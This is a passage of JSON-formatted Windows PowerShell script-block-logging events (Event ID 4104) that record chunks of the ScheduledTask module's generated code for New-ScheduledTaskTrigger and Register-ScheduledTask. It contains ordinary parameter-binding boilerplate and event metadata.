$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WeeksInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WeeksInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByWeekly', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskTrigger' -Alias '*'\r\n        \r\n\r\nfunction Register-ScheduledTask\r\n{\r\n    [CmdletBinding(Defau",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413071Z"
    },
    "EventRecordID": 84,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 8,
    "MessageTotal": 12,
    "ScriptBlockText": "ltParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=6)]\r\n    [Parameter(ParameterSetName='Xml', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Password},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [Parameter(ParameterSetName='Xml', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=0)]\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='Principal', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [Parameter(ParameterSetName='Xml', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=5)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=2)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=6)]\r\n    [Parameter(ParameterSetName='User', Position=8)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='User', Position=7)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum]\r\n    ${RunLevel},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Principal') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBound",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413098Z"
    },
    "EventRecordID": 85,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 9,
    "MessageTotal": 12,
    "ScriptBlockText": "Parameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByPrincipal', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 